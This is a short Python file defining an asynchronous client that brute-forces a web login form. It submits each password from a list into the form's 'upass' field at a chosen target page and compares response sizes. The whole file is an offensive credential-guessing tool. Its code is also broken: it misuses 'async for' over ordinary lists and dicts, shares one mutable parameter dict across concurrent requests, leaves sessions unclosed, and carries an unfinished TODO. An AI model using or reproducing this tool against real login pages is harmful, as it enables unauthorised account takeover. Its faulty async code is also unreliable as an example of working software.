from asyncio import Task, gather, get_event_loop
from aiohttp import ClientSession


# Bruteforcing Forms
class BruteForceClient(object):
    def __init__(self, form_params, target_webpage, password_list):
        self.target = target_webpage
        self.params = form_params
        self.passwords = password_list

    async def bruteforce(self):
        resps = await gather(*[Task(self.async_post(_pass)) for _pass in self.passwords], return_exceptions=True)
        result = {}
        async for resp in resps:
            async for k, v in resp.items():
                result[k] = resp[k].content.total_bytes

        # TODO: asynchronize for loop


    async def async_post(self, password):
        data = self.params
        data['upass'] = password
        resp = await ClientSession().post(
            self.target,
            data=self.params
        )
        return {
            password: resp
        }
